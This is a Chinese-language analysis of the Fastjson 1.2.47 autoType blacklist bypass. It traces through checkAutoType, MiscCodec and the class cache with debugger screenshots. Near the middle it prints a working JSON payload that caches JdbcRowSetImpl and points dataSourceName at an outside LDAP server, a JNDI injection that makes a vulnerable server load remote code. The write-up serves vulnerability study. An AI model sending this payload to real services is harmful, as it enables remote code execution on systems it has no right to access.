# Fastjson-1.2.47版本绕过

在FastJson1.2.25版本之后，做了一个修复
<img width="1866" height="234" alt="image" src="https://github.com/user-attachments/assets/37727640-6828-422c-bbff-b88ea716f788" />

再次使用JdbcRowSetImpl链，报错，提示autoType is not support,
原因是在检测AotoType时添加了一个checkAotoType方法做了校验

<img width="1632" height="324" alt="image" src="https://github.com/user-attachments/assets/d461c583-1c2f-4efc-a68f-c73c8d667025" />

而在之前的版本中，是检测完之后直接调loadClass进行加载。

<img width="1745" height="288" alt="image" src="https://github.com/user-attachments/assets/c5d41e54-8ecd-48dd-ae0a-84f582f9b290" />

跟进到checkAotoType方法内部，发现有非常多的if判断

<img width="1937" height="1266" alt="image" src="https://github.com/user-attachments/assets/7684d07f-d100-4332-bbaa-b2c14ad62f0a" />

这里分析最关键的判断节点

节点1：

811行，如果 autoTypeSupport || expectClass != null

进入到黑白名单循环遍历，
如果是白名单的话，就会调用loadClass并返回，
denyList黑名单匹配到的话，就会抛出异常

<img width="1511" height="503" alt="image" src="https://github.com/user-attachments/assets/148a2534-fde7-4f0e-9a7d-167a5936f230" />

黑名单：

<img width="657" height="726" alt="image" src="https://github.com/user-attachments/assets/3e415f1f-1952-4a64-8909-38a7c1f7b594" />

节点2：

827行,
在这里就是说，先getClassFromMapping到缓存中去找typeName，
如果没有在缓存中找到，那就 deserializers.findClass到反序列化器中去找，
在缓存或者反序列化器任意一处找到了这个class，那么就直接return返回class，直接跳过黑白名单验证。

<img width="1598" height="420" alt="image" src="https://github.com/user-attachments/assets/cd032f88-1b8f-4c0a-b484-15353b595716" />

节点3：

840行,
在上面缓存依旧没找到类时，
autoTypeSupport没开启时，
就又会调用依次黑白名单遍历。

<img width="1563" height="636" alt="image" src="https://github.com/user-attachments/assets/4c857179-7c84-4698-967f-c27d03d660a7" />

那么针对绕过方面，就只能在节点2做分析

因为typeName就是我们传入进来的@type。

checkAutoType()会首先调用 getClassFromMapping(typeName)去缓存里面找，
如果找不到，就会调用 deserializers.findClass(typeName)到反序列化器里面去找，
只要在缓存或者反序列化器中的任意一处找到了class，就会直接return，
后续的黑白名单就不会被执行。

现在需要做的，就是考虑如何将我们的目标类放入缓存中，然后让deserializer.findClass能识别它。


跟进getClassFromMapping,
搜索mappings的用法
<img width="2348" height="1512" alt="image" src="https://github.com/user-attachments/assets/a6562e11-5d02-47d5-91bb-7f15c0e05ed3" />

在loadClass中存在三个调用,
搜索用法，在MiscCodec类下存在调用

当clazz == Class.class条件成立，就会调用loadClass,
这个Class.class 就是 java.lang.Class 的 Class 对象

在此处，如果要让loadClass被调用，那就需要让这个clazz等于java.lang.Class，
把strVal字符串当作类名传进去，调用TypeUtils.loadClass加载，
成功加载后就会执行mappings.put(className，clazz)放到缓存中， 从而绕过checkAutoType()的黑白名单检测。

<img width="1797" height="1512" alt="image" src="https://github.com/user-attachments/assets/c1923197-6dfa-41e9-8294-3f564e588ece" />

在上面的代码中，判断键值是否为val，之后提取键值val对应的值赋值给objVal，之后在赋值给strVal。

<img width="1188" height="1287" alt="image" src="https://github.com/user-attachments/assets/4651e6fc-299a-428a-91c6-29c852c45ad8" />

Payload：

<img width="1676" height="153" alt="image" src="https://github.com/user-attachments/assets/953323fd-cc58-4c3d-b602-38b765b429ec" />

"{{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
        "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.26.1:1389/zgwz3n\",\"autoCommit\":true}}"

如果要绕过黑白名单，
首先传入一个java.lang.Class 对应的val值为恶意类 如（com.sun.rowset.JdbcRowSetImpl）

这一步是将恶意类放入缓存中，
之后再用之前的payload，
如果com.sun.rowset.JdbcRowSetImpl放入缓存，那么再次加载的时候，这个类就已经在缓存中了，
在checkAutoType()方法中就会直接return，不会进行黑白名单检测，达到绕过黑名单。

<img width="1806" height="1155" alt="image" src="https://github.com/user-attachments/assets/046f4cc4-0605-4d67-8ca8-a68e0d6cef0c" />

调试分析：

代码走到checkAutoType(),
到缓存中去找typeName，我们第一次传入的是java.lang.Class,
在这里找到了，之后return

<img width="2348" height="1512" alt="image" src="https://github.com/user-attachments/assets/7a1c4373-a50c-4eaf-b201-07ee569cbe03" />

之后就会去获取,
MiscCodec的反序列化器

<img width="2348" height="1512" alt="image" src="https://github.com/user-attachments/assets/1188acbd-30e0-42c8-99d8-38bb5d4fe434" />

之后代码进入到MiscCodec,
获取了我们传入的JdbcRowSetImpl类

<img width="2348" height="1512" alt="image" src="https://github.com/user-attachments/assets/12c343cf-d472-454b-ab87-8ffdf2182f6d" />

往下走,
来到了判断 clazz == Class.class条件成立,
调用TypeUtils.loadClass

<img width="1995" height="798" alt="image" src="https://github.com/user-attachments/assets/0a71e3f8-f8b2-4f7a-9f80-c7638ea634ff" />

代码来到loadClass,
mappings.put将获取到的JdbcRowSetImpl放入缓存中，

<img width="2348" height="1512" alt="image" src="https://github.com/user-attachments/assets/eb71126d-4a02-4d75-af67-a53a8ffe4e45" />

接着代码又回到checkAotoType,
从缓存中找JdbcRowSetImpl，刚才已经放进去了，这里找到之后直接return，跳过了黑白名单的校验。

<img width="2348" height="1512" alt="image" src="https://github.com/user-attachments/assets/8843df54-5ea1-4f79-b821-dfc9099b3be0" />

之后就和JdbcRowSetImpl链一样的调用流程了。

参考连接：

https://y4er.com/posts/fastjson-learn/

https://www.bilibili.com/video/BV1pP411N726/

